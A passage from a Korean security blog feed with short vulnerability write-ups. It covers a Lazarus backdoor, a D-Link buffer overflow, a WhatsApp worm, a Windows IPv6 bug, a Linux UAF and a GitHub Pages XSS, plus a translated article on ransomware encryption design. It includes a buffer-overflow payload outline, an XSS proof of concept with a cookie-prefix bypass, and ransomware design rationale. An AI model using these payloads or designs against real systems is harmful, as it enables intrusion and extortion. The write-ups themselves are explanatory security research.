레지스트리에 저장합니다. 정상적인 서비스로 위장하기 위해서 서비스 이름과 표시되는 이름은 이미 존재하는 서비스에서 무작위로 단어를 조합하여 생성됩니다. 그 후 infection ID를 무작위 값으로 생성하여 다음과 같이 레지스트리에 저장합니다.</p><pre><code class="hljs ini"><span class="hljs-section">[HKLM\SOFTWARE\Microsoft\DirectX]</span><span class="hljs-attr">UsageMask</span> = &lt;CONFIG_DATA&gt;</code></pre><p>Vyveva의 메인인 백도어는 C&amp;C 서버에 접속하고 명령어를 실행합니다. 23개의 명령어가 존재하며, 일부는 비동기식으로 자체 스레드에서 실행됩니다. 대부분 파일 및 프로세스 작업이나 정보 수집을 위한 명령어지만 파일 <a href="https://attack.mitre.org/versions/v8/techniques/T1070/006/">timestomping</a>을 위한 명령어도 존재합니다. 또한 백도어는 새로 연결되거나 연결이 끊어진 드라이브를 모니터링하며 로그온한 사용자 수를 모니터링하는 세션 감시 기능 또한 존재합니다. 새 드라이브나 세션 이벤트가 발생하면 기존 설정된 간격을 무시하고 C&amp;C 서버에 연결합니다. 발견된 Vyveva의 샘플들은 다음과 같습니다.</p><table><thead><tr><th>SHA-1</th><th>Filename</th><th>Description</th></tr></thead><tbody><tr><td>DAD50AD3682A3F20B2F35BE2A94B89E2B1A73067</td><td>powerctl.exe</td><td>Installer</td></tr><tr><td>69529EED679B0C7F1ACC1FD782A4B443CEC0CF83</td><td>powerctl.dll</td><td>Loader (x86)</td></tr><tr><td>043ADDFB93A10D187DDE4999D78096077F26E9FD</td><td>wwanauth.dll</td><td>Loader (x64)</td></tr><tr><td>1E3785FC4FE5AB8DAB31DDDD68257F9A7FC5BF59</td><td>wwansec.dll</td><td>Loader (x86)</td></tr><tr><td>4D7ADD8145CB096359EBC3E4D44E19C2735E0377</td><td>msobjs.drx</td><td>Backdoor (ecnrypted)</td></tr><tr><td>92F5469DBEFDCEE1343934BE149AFC1241CC8497</td><td>msobjs.drx</td><td>Backdoor (dencrypted with fixed MZ header)</td></tr><tr><td>A5CE1DF767C89BF29D40DC4FA6EAECC9C8979552</td><td>JET76C5.tmp</td><td>Bacckdoor Tor library (encrypted)</td></tr><tr><td>66D17344A7CE55D05A324E1C6BE2ECD817E72680</td><td>JET76C5.tmp</td><td>Backdoor Tor library (dencrypted with fixed MZ header)</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>backdoor</tag>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>lazarus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26709: D-Link DSL-320B-D1 Pre-Auth Buffer Overflow</title>
    <link href="/2021/04/11/insu/2021-04-11/"/>
    <url>/2021/04/11/insu/2021-04-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://packetstormsecurity.com/files/162133/CVE-2021-26709_advisory.txt">D-Link DSL-320B-D1 Pre-Authentication Buffer Overflow</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>DSL-320B-D1, EU_1.25 and lower</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ADSL 모뎀, DSL-320b-D1, EU_1.25 이하의 버전에서 인증되지 않은 사용자가 원격에서 디바이스를 탈취할 수 있는 Stack Buffer Overflow 취약점이 발견되었습니다.</p><p>취약점은 로그인을 담당하는 <code>login.xgi</code>에서 <code>user</code>와 <code>pass</code> 인자를 통해 발생합니다.</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /login.xgi?<span class="hljs-attribute">user</span>=<span class="hljs-string">&quot; + payload + &quot;</span>&amp;pass=abcde HTTP/1.1\\nHost: <span class="hljs-string">&quot; +</span><span class="hljs-string">host + &quot;</span>\\n\\n<span class="hljs-string">&quot;</span></code></pre><p><code>user</code> 파라미터를 사용해 취약점을 악용하기 위해서 구성되는 페이로드는 다음과 같습니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">OFFSET</span> = <span class="hljs-number">652</span><span class="hljs-attribute">ADDR</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">8</span>ab<span class="hljs-number">0</span><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*OFFSET<span class="hljs-attribute">payload</span> += pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, ADDR)<span class="hljs-attribute">payload</span> += shellcode</code></pre><p>반면에 <code>pass</code> 파라미터는 오프셋으로 641을 사용합니다. 페이로드는 GET request에서 파라미터로 전달되어야 하며 ROP를 사용하면 하드 코딩된 주소를 사용하지 않고 exploit이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bof</tag>
      
      <tag>insu</tag>
      
      <tag>d-link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Architecture of Ransomware Part 1</title>
    <link href="/2021/04/11/idioth/arch_of_ransomware_part1/"/>
    <url>/2021/04/11/idioth/arch_of_ransomware_part1/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요! idioth입니다. 오랜만에 번역글을 하나 들고 왔습니다. 최근 ghidra 시리즈를 진행 + 학교 과제 + 그 외의 개인 사정으로 인해 보려고 했던 글을 좀 미뤄놔서 좀 제 자신을 환기시킬 겸 읽으면서 번역을 쫙해봤습니다.</p><p>랜섬웨어가 유행이라고 해야 하나 보안 필드의 사람들 뿐만 아니라 일반적인 사람한테도 많이 익숙해진 지는 꽤 되었다고 생각을 합니다. 하지만 랜섬웨어는 계속해서 발전하고 있죠! 파트 1 부분은 너무 어렵지 않은 이야기가 주를 이루니 가벼운 마음으로(?) 읽어주시면 될 것 같습니다!</p><p>번역글은 늘…ㅎㅎ 의역과 오역이 존재할 수 있고 잘못된 부분은 지적해주시면 감사하겠습니다!</p><hr><blockquote><p>원문 글 : <a href="https://infosecwriteups.com/architecture-of-a-ransomware-1-2-1b9fee757fcb">Architecture of a ransomware (1/2)</a></p></blockquote><p>COVID-19로 인해 원격 업무가 증가함에 따라 랜섬웨어와 관련된 사건이 증가하고 있다. 모든 랜섬웨어는 같은 방식으로 동작하지 않으며 공격에 더 나은 대응을 하기 위해서는 내부적으로 어떻게 동작하는지 이해하는 것이 중요하다. 이 게시글이 랜섬웨어의 암호 메커니즘을 리버싱하거나 감염을 막는데 도움이 되길 바란다. </p><p>어떤 방식으로 동작하는지 파악하는데 가장 좋은 방법은 직접 만들어보는 것이다. 따라서 파트 1에서는 원리와 개념에 대해 설명하고 파트 2에서는 원리를 적용시켜 랜섬웨어를 만들어 볼 것이다.</p><h1 id="기본-원리"><a href="#기본-원리" class="headerlink" title="기본 원리"></a>기본 원리</h1><p>랜섬웨어에서 가장 중요한 개념은 사용되는 암호화 유형이다. 주로 사용되는 두 가지가 있고 괜찮은 랜섬웨어들에서도 사용된다. 간단하게 설명하고 스스로 공부할 수 있는 reference를 제공할 것이다.</p><h2 id="대칭키-암호화"><a href="#대칭키-암호화" class="headerlink" title="대칭키 암호화"></a>대칭키 암호화</h2><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled.png"></p><p>대칭키 암호화는 대부분 사람들에게 익숙하다. 한 개의 키를 가지고 데이터 암호화, 복호화에 모두 사용한다. zip 파일와 office 문서 등에 사용되며 암호화할 때 사용한 password와 복호화에 사용하는 password가 같다.</p><h2 id="비대칭키-암호화"><a href="#비대칭키-암호화" class="headerlink" title="비대칭키 암호화"></a>비대칭키 암호화</h2><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%201.png"></p><p>비대칭키 암호화는 대부분 사람들이 혼란스러워하는 개념이다. 하지만 특정 구현을 생각하지 않으면 이해하기 쉽다.</p><p>일반적으로 비대칭키 암호화는 두 개의 키를 사용한다. 모든 키를 사용해서 파일을 암호화할 수 있지만 다른 키를 사용해서 복호화를 해야 한다.</p><p>secret key와 public key에 대해서 들어봤을 것이다. 이것들은 이름처럼 단순하게 public 하거나 secret 하게 보관되는 키이다. 누구나 public key에 접근할 수 있고 암호화에 사용할 수 있지만 복호화에 secret key가 필요하기 때문에 해당 키의 소유자만이 복호화할 수 있다. 그리고 secret key를 사용해 모든 정보를 암호화할 수 있으며 해당 키 소유자의 public key를 통해 누구나 읽을 수 있다. 이러한 행위를 signing이라 부르며 비밀 목적이 아니라 해당 메시지를 보낸 사람을 증명하기 위해서 사용된다.</p><h1 id="랜섬웨어-관련-애플리케이션"><a href="#랜섬웨어-관련-애플리케이션" class="headerlink" title="랜섬웨어 관련 애플리케이션"></a>랜섬웨어 관련 애플리케이션</h1><p>regular infection의 흐름을 생각해보자. 랜섬웨어 페이로드는 여러 가지 벡터(피싱, 소프트웨어 취약점 등) 중 하나에 의해 전달되고 실행되어 모든 파일이 암호화된다. 그 후 파일을 복호화하기 위해 무언가를 지불하라는 창이 뜬다. 이를 어떻게 수행할 수 있을까?</p><p>첫 번째는 대칭키 암호화를 통해 파일을 암호화하는 것이다. 하지만 이는 좋은 방법이 아니다. 괜찮은 랜섬웨어들은 한 가지 중요한 이유로 이 방법을 사용하지 않는다. 랜섬웨어가 파일을 암호화할 때, 어딘가에 암호화 키가 존재할 것이다. 대칭키 암호화를 사용한다면 암호화에 사용된 키가 복호화에 사용될 수 있다. 포렌식 분석가가 암호화에 사용된 키를 복구하여 파일을 복호화할 수 있다. 비대칭 key를 사용하면 암호화와 복호화에 다른 키를 사용하므로 복호화 키만 잘 보호하면 victim의 컴퓨터에 암호화 키가 있는 것은 큰 문제가 되지 않는다.</p><p>해커로서 고민해야 할 다른 중요한 점은 victim이 지불했을 경우를 위한 키가 필요한 것이다. 대칭키 암호화를 사용하면 바이너리 코드에 키를 하드코딩(리버싱할 수 있으므로 안 좋은 방법이다)하거나 키를 생성해서 우리의 서버에 전송할 방법(intercept 당할 수 있고 연결이 끊어지면 키가 없어서 키를 줄 수 없다)을 찾아야 한다. <a href="https://www.computerworld.com/article/2489311/cryptodefense-ransomware-leaves-decryption-key-accessible.html">이런 형태의 첫 번째 랜섬웨어는 CryptoDefense의 변종</a>으로 생성된 키를 서버로 전송한 후 victim의 로컬에 파일을 남기는 바람에 복호화가 가능했다.</p><p>이러한 점은 파일을 암호화할 때 비대칭키 암호화를 사용해야 한다는 걸 알려준다. 하지만 key pair를 생성한 후 public key를 코드에 하드 코딩하여 모든 파일을 암호화하는 것은 불가능하다.</p><p>비대칭키 암호화는 대칭키 암호화에 비해서 느리다. 파일을 암호화는 것이 오래 걸리면 victim이 알아차리고 컴퓨터를 꺼서 암호화가 실패할 수 있다. 그러면 어떻게 해야 할까?</p><h2 id="하이브리드-접근법"><a href="#하이브리드-접근법" class="headerlink" title="하이브리드 접근법"></a>하이브리드 접근법</h2><p>이 문제를 해결하기 위해 하이브리드 접근법을 사용할 수 있다. 페이로드를 생성할 때 페이로드와 관련된 public/private key도 생성한다. 페이로드에 public key를 하드 코딩하고 infection이 발생할 때마다 페이로드는 대칭 암호화에 사용될 키를 생성한다. 암호화가 되면 하드 코딩된 public key로 대칭 키를 암호화한다(물론 메모리/디스크의 평문 대칭키는 없앤다). 암호화된 대칭 키는 어딘가에 저장된다. 하지만 다른 문제가 존재한다.</p><h3 id="Key-re-utilization-chosen-plaintext-attack"><a href="#Key-re-utilization-chosen-plaintext-attack" class="headerlink" title="Key re utilization / chosen plaintext attack"></a>Key re utilization / chosen plaintext attack</h3><p><a href="https://simple.wikipedia.org/wiki/Chosen-plaintext_attack">Chosen plaintext attack</a>은 암호화 전 평문을 알고 있고 암호화된 샘플이 많을 경우 암호화된 결과에서 키를 유추할 수 있는 암호화 공격이다. 잘 알려진 포맷을 가진 대부분 파일의 헤더에서 발생할 수 있다. 모든 파일에 같은 키를 사용한다면 특정 조건에서 복호화될 수 있다. <a href="https://blog.checkpoint.com/2014/08/27/hacking-the-hacker/">이 문제는 실제로 DirCrypt에서 발생했다</a>. 잘못된 암호화 구현과 key 재사용으로 인해 암호화가 리버싱 되었다.</p><p>이 이슈는 각 파일에 다른 키를 사용하여 해결할 수 있다. 파일마다 대칭키를 생성해서 암호화하고 페이로드에 있는 public key로 키를 암호화한 후 암호화된 대칭 키를 저장하고 평문으로 된 대칭 키를 삭제할 수 있다.</p><p>많은 랜섬웨어들은 이 방법을 사용하여 암호화된 파일 이름 + 암호화된 public key가 적힌 텍스트 파일을 생성한다. 복호화 툴을 사용하면 이 텍스트 파일을 읽어서 private key로 각 키를 복호화한 후 파일을 복호화한다. 우리는 다른 것을 사용할 것이다.</p><blockquote><p>Technical note: 이러한 유형의 공격은 기본적으로 각 파일 스트림에 다른 randomized initialization vector(IV)를 사용하므로 우리가 사용할 AES-256에는 영향을 받지 않지만, 모든 랜섬웨어에 대한 일반적인 개념을 설명하고 싶었다. 악성코드 개발자가 실수하면 데이터를 복구하는데 도움이 되었으면 한다.</p></blockquote><p><a href="https://stackoverflow.com/questions/7932061/is-the-result-of-a-rsa-encryption-guaranteed-to-be-random/7933071#7933071">이 공격은 기본적으로 randomize 되지 않기 때문에 RSA 암호화에 영향을 줄 수 있다</a>. 다음의 이유 때문에 우리에 대해서는 문제가 되지 않을 것이다:<br>a) RSA를 사용하여 암호화할 것은 AES 암호화 키뿐이며 분석할 샘플을 구성하지 않는다.<br>b) 암호화에 randomziation을 추가하는 <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Optimal asymmetric encryption padding</a>과 결합된 RSA를 사용할 것이다.</p><p>파일마다 다른 키를 사용해서 오는 다른 이득은 각 파일을 암호화한 후 암호화 키를 삭제할 수 있는 것이다. 따라서 분석가가 키를 복구하려고 하면 마지막 파일에 사용된 키만 복구할 수 있다. 모든 파일에 같은 키를 사용하면 암호화 과정의 어떤 부분에서든 키를 복구할 수 있고 모든 파일을 복구할 수 있다.</p><h1 id="속도-고려"><a href="#속도-고려" class="headerlink" title="속도 고려"></a>속도 고려</h1><p>위에서 설명한 모든 특징을 적용시켜 코딩한 랜섬웨어는 만족스럽지 않았다. 32비트 키(AES-256)를 사용할 때 초기 벤치마크에서 1분에 1GB 암호화 속도가 나왔다. 이 속도는 victim의 하드웨어 의존성이 높고, 필자의 컴퓨터를 암호화할 수 없으므로 VM에서 실행했지만 여전히 1TB를 암호화하는데 16분이 걸렸다.</p><p>현대의 랜섬웨어들은 어떻게 몇 기가바이트의 정보를 초 단위로 암호화할까? 정답은 파일 구조(file structure)에 있다.</p><p>사실상 파일의 모든 부분을 사용할 수 없게 암호화할 필요가 없다. 파일 포맷에 따라 헤더와 initial bytes만 암호화해도 사용할 수 없게 만들 수 있다. 아마도 파일의 첫 5MB만 암호화하면 된다. 무슨 생각을 하는지 알고 있다. txt/ascii 파일 같은 간단한 파일은 <a href="https://linux.die.net/man/1/strings">strings</a> 같은 툴을 사용해서 읽을 수 있지만 그런 파일들은 대부분 2kb를 넘지 않는다. 게다가 victim에게 중요한 파일 대부분은 문서, 사진, 비디오이다. 파일에 대해 포렌식 분석을 시도하고 내용 일부를 복구할 수 있지만 개별적인 파일에 대해 수행하는 수동적인 방법이고 현실적이지 않다.</p><p>파일의 마지막 부분을 바꾸는 것도 이상적이며 끝 부분에 2개의 구조를 추가하여 활용할 수 있다.</p><ol><li>Initalization vector: AES로 파일을 암호화할 때 initialization vector가 필요하다. 이는 암호화 프로세스를 시작할 때 생성된다.</li><li>Encrypted decryption key: 각 파일의 끝에 암호화된 복호화 키를 추가할 수 있다. 이는 파일들의 암호화 키를 담은 text 파일의 필요성을 없애준다.</li></ol><p>이런 것들이 추가된 암호화된 파일 구조는 다음과 같다:</p><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%202.png"></p><p>“파일의 일부만 암호화하는 것”의 또 다른 이점은 원본 파일을 지우고 암호화된 파일을 생성할 필요가 없는 것이다. 새 파일을 생성할 필요 없이 존재하는 파일에 쓰기 권한만 있으면 된다. 또한 500gb MySQL 데이터베이스 같은 매우 큰 파일을 빠르게 암호화할 수 있다.</p><h1 id="마지막-고려사항"><a href="#마지막-고려사항" class="headerlink" title="마지막 고려사항"></a>마지막 고려사항</h1><p>각 과정에 대해 적절한 암호화를 선택하면 악성코드를 배포하기 위한 프레임워크를 디자인해야 한다. 모든 victim이 같은 키를 공유하는 걸 원하지 않으므로 페이로드마다 키를 자동적으로 생성하는 process를 포함해야 한다(한 명이 ransom을 지불하고 key를 배포하면 모두가 암호화할 수 있는 걸 방지해야한다). 각 victim에 대한 키를 저장하는 데이터베이스도 필요하다.</p><p>이 부분은 나쁜 목적으로 사용될 수 있으므로 코딩하지 않고 어떻게 수행할 수 있는지도 설명하지 않을 것이다. 이 글의 아이디어는 보안 팀들이 이전 랜섬웨어가 잘못되었고, 감염 발생/확산을 막을 수 있음을 보여줄 것이다.</p><p>단일 페이로드에 사용할 비대칭 키를 생성하기 위해 ssh-keygen을 사용할 것이다.</p><pre><code class="hljs angelscript">ssh-keygen -b <span class="hljs-number">2048</span> -m pem -f pem</code></pre><p>이 명령어는 pem 포맷으로 public(<code>pem.pub</code>)과 private key(<code>pem</code>)을 생성한다. <code>pem.pub</code>를 완성된 실행 파일과 합쳐서 테스트해보자.</p><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%203.png"></p><blockquote><p>Generating both keys</p></blockquote><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%204.png"></p><blockquote><p>Public key</p></blockquote><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%205.png"></p><blockquote><p>Private key</p></blockquote><p>파트 1은 여기까지이다. 파트 2에서는 멀웨어를 코딩하고 얼마나 빠르게 파일을 암호화할 수 있는지 시연해 볼 것이다.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>crypto</tag>
      
      <tag>ransomware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] WhatsApp을 통해 퍼진 안드로이드 Malware</title>
    <link href="/2021/04/10/fabu1ous/2021-04-10/"/>
    <url>/2021/04/10/fabu1ous/2021-04-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/new-wormable-android-malware-spreads-by-creating-auto-replies-to-messages-in-whatsapp/">WhatsApp Auto-reply Malware</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Android WhatsApp</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Check Point Research가 Google Play Store에서 사용자의 WhatsApp 메시지를 통해 확산되는 악성 애플리케이션을 발견했습니다. 해당 악성 앱은 Flix Online이라는 이름으로 Google Play Store에 등록되어 있었고 피해자의 모바일 기기 속 WhatsApp 메시지로 확산되는 웜(Worm)입니다. Check Point는 WhatsApp과 같이 정상적인 앱의 데이터를 조작하거나 탈취할 수 있다는 점에서 해당 웜을 혁신적이고 위험한 새로운 기술이라 평가하고 있습니다.</p><p>Flix Online이 기기에 설치되면 사용자에게 ‘Overlay’, ‘Battery Optimization Ignore’, ‘Notification’ 권한을 요청합니다. 이중 핵심이 되는 ‘Notification’ 권한은 Flix Online이 모바일 기기가 받는 모든 메시지에 대한 알림에 접근, 답장, 해제할 수 있게 합니다. Flix Online은 <code>OnNotificationPosted</code> 콜백을 사용해 알림 패키지의  <code>status.BarNotification0.getPackageName()</code>을 검사해 알림 패키지의 근원지가 WhatsApp인지 판단합니다. 그 후 해당 알림을 제거함과 동시에 제목 및 내용을 탈취합니다. 또한 Inline reply 컴포넌트를 사용해 추가 감염을 위한 답장을 전송합니다.</p><p>두 달 동안 Flix Online 앱은 약 500번 다운로드되었고 현재는 Google Play Store에서 삭제되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>malware</tag>
      
      <tag>whatsapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-24086: Windows IPv6 denial of service vulnerability </title>
    <link href="/2021/04/09/l0ch/2021-04-09/"/>
    <url>/2021/04/09/l0ch/2021-04-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html">Analysis of a Windows IPv6 Fragmentation Vulnerability: CVE-2021-24086</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft가 2월에 패치한 Windows의 IPv6 서비스 거부 취약점에 대한 세부 분석 정보가 공개되었습니다.</p><p>IPv6 source node는 최대 전송 단위(MTU) 보다 큰 패킷을 보내기 위해 패킷을 조각화(Fragmentation)해 전송하고 이를 수신할 때 다시 조립합니다. Windows에서는 IPv6 패킷의 중첩 조각화를 허용해 조각화된 IPv6 패킷에 다른 조각화된 패킷을 구성할 수 있는데,  조각화된 패킷을 재조립하는 <code>tcpip!Ipv6pReassembleDatagram</code> 에서 NULL 포인터 역참조 취약점이 발생합니다.</p><p>수신한 조각화 패킷을 처리하는 <code>tcpip!Ipv6pReceiveFragment</code>는 중첩된 조각화 패킷을 수신하면  <code>tcpip!Ipv6pReassembleDatagram</code>을 재귀적으로 호출합니다. 해당 함수는 확장 헤더의 크기를 1500으로 제한한 뒤 <code>NdisGetDataBuffer</code> 를 호출해 패킷 데이터가 있는 <code>NET_BUFFER</code> 구조체에서 확장 헤더 크기 + 패킷 헤더 크기(<code>0x28</code> 고정)만큼을 읽어 반환합니다. 그러나 중첩된 조각화 패킷의 확장 헤더의 크기를 제한하지 않아 확장 헤더 크기가 <code>0xffd0</code>면<code>NdisGetDataBuffer</code> 함수는 <code>0xffd0 + 0x28(패킷 헤더) = 0xfff8</code> 크기만큼 읽고 NULL을 반환합니다. 결과적으로 반환된 NULL 값을 <code>tcpip!Ipv6pReassembleDatagram</code> 에서 참조하게 되고 NULL 포인터 역참조 취약점이 발생합니다.</p><p>해당 취약점은 악성 UDP 패킷을 IPv6를 통해 전송하여 원격으로 트리거할 수 있는 것으로 알려졌습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>denial of service</tag>
      
      <tag>null pointer dereference</tag>
      
      <tag>ipv6</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3483: Linux kernel의 nosy driver에서 발견된 UAF bug</title>
    <link href="/2021/04/08/insu/2021-04-08/"/>
    <url>/2021/04/08/insu/2021-04-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/10">CVE-2021-3483: Linux kernel: a use-after-free bug in nosy driver</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Linux Kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Linux Kernel의 <code>Linux/drivers/firewire/nosy.c</code>에서 UAF 버그가 발견되었습니다.</p><p>Nosy는 IEEE 1394 드라이버, 애플리케이션 또는 펌웨어 개발과 프로토콜 분석에 사용되는 IEEE 1394 패킷 스니퍼이며 nosy driver는 각각의 device에서 <a href="https://docs.huihoo.com/doxygen/linux/kernel/3.7/structpcilynx.html">pcilynx structure</a>를 할당합니다.</p><p>해당 취약점은 nosy driver가 device에 pciynx structure를 할당하고 해제하는 과정에서 발생하며 취약점이 발생하는 시나리오는 다음과 같습니다.</p><ol><li>처음 nosy device를 열고 <code>NOSY_IOC_START</code> ioctl 커맨드를 호출합니다. 그럼 client A가 할당되고, doubly linked list에 추가됩니다.</li><li>두번째로, nosy device를 열고 <code>NOSY_IOC_START</code> ioctl 커맨드를 호출합니다. 그럼 client B가 할당되고 똑같이 doubly linked list에 추가 됩니다.</li><li>client A에서 <code>NOSY_IOC_START ioctl</code> 커맨드를 호출합니다. 그럼 client A는 doubly linked list에서 읽어지고, doubly linked list는 엉망이 됩니다.</li><li>처음 nosy device를 닫으면 <code>nosy_release</code>가 호출되며 <code>nosy_release</code> 에서 client A가 unlink 되고 free 됩니다.</li><li>두번째 nosy device를 닫으면, client A가 참조되어 UAF가 발생합니다.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>insu</tag>
      
      <tag>uaf</tag>
      
      <tag>nosy driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Github Private Pages XSS 취약점</title>
    <link href="/2021/04/08/idioth/2021-04-08/"/>
    <url>/2021/04/08/idioth/2021-04-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://robertchen.cc/blog/2021/04/03/github-pages-xss">Breaking GitHub Private Pages for $35k</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>github private pages</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Github Private Pages에서 XSS 취약점이 발견되었습니다. 해당 취약점은 github private pages의 custom authentication flow 과정 중 <code>__Host-</code> prefix를 우회하고 <code>page_id</code> 파라미터를 통해 발생합니다.</p><p>github pages는 별도의 <code>github.io</code> 도메인에서 호스팅 되어 <code>github.com</code> 인증 쿠키가 private pages server로 전송되지 않습니다. 따라서 private page authentication은 <code>github.com</code>과의 추가적인 통합 없이는 사용자 인증할 방법이 없습니다. 이러한 이유로 github은 custom authentication flow를 만들었습니다.</p><p>취약점 제보 당시 github private pages의 custom authentication flow는 다음과 같습니다.</p><ol><li>private page에 접속하면 서버는 <code>__Host-gh_pages_token</code>가 존재하는지 확인합니다. 쿠키가 없거나 잘못 설정된 경우 <code>https://github.com/login</code>으로 리다이렉트 됩니다. initial redirect는 <code>__Host-gh_pages_session</code> 쿠키에 nonce를 저장합니다. 해당 쿠키는 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#attributes">__Host- cookie prefix</a>를 사용하여 호스트가 아닌 도메인이 JavaScript에서 설정되는 것을 방지합니다.</li><li><code>/login</code>은 <code>/pages/auth?nonce=&amp;page_id=&amp;path=</code>로 리다이렉트 됩니다. 이 엔드포인트는 임시 인증 토큰을 생성하여 <code>token</code> 파라미터에 <code>https://pages-auth.github.com/redirect</code>에 전달합니다. <code>nonce</code>, <code>page_id</code>, <code>path</code>는 비슷하게 전달됩니다.</li><li><code>/redirect</code>는 <code>https://repo.org.github.io/__/auth</code>로 바로 이동합니다. 마지막 엔드포인트는 <code>repo.org.github.io</code> 도메인, <code>__Host-gh_pages_token</code>, <code>__Host-gh_pages_id</code>에 인증 쿠키를 설정합니다. 또한 이전에 설정된 <code>__Host-gh_pages_session</code>의 <code>nonce</code>도 확인합니다.</li><li>authentication flow에서 original request path와 page id 같은 정보는 <code>path</code>와 <code>page_id</code> 쿼리 파라미터에 저장됩니다. nonce는 <code>nonce</code> 파라미터에서 전달됩니다.</li></ol><p><code>https://repo.org.github.io/__/auth</code>의  <code>page_id</code> 파라미터는 whitespace를 무시하여 파싱 되고 정수로 변환되어 <code>Set-Cookie</code> 헤더에 렌더링 됩니다. <code>page_id=12345%0d%0a%0d%0a</code>를 전송하여 <code>Set-Cookie</code> 헤더 뒤에 위치한 Location 헤더를 무시하고 body content를 렌더링할 수 있습니다. 또한 <code>page_id</code>에서 null byte를 만나면 integer parsing이 종료됩니다. 헤더에 null byte가 존재하면 response가 reject 되므로 body의 시작 부분에 null byte를 삽입하여 XSS를 트리거할 수 있습니다.</p><pre><code class="hljs latex">&quot;?page_id&quot; + encodeURIComponent(&quot;<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>00&lt;script&gt;alert(origin)&lt;/script&gt;&quot;)</code></pre><p>하지만 nonce가 조작된 <code>page_id</code>의 전송을 방지하여 이를 우회하여야 합니다. 브라우저에서 쿠키의 대소문자를 다르게 처리하여 <code>__Host-</code>와 <code>__HOST-</code>를 다르게 처리합니다. 하지만 github private page server에서는 쿠키를 파싱할 때 대소문자를 무시하므로 <code>__Host-</code> prefix 우회가 가능합니다. 전체적인 POC는 다음과 같습니다.</p><pre><code class="hljs perl">&lt;script&gt;const id = location.search.substring(<span class="hljs-string">&quot;?id=&quot;</span>.length)document.cookie = <span class="hljs-string">&quot;__HOST-gh_pages_session=dea8c624-468f-4c5b-a4e6-9a32fe6b9b15; domain=.private-org.github.io&quot;</span>;location = <span class="hljs-string">&quot;https://github.com/pages/auth?nonce=dea8c624-468f-4c5b-a4e6-9a32fe6b9b15&amp;page_id=&quot;</span> + id + <span class="hljs-string">&quot;%0d%0a%0d%0a%00&lt;script&gt;alert(origin)%3c%2fscript&gt;&amp;path=Lw&quot;</span>;&lt;<span 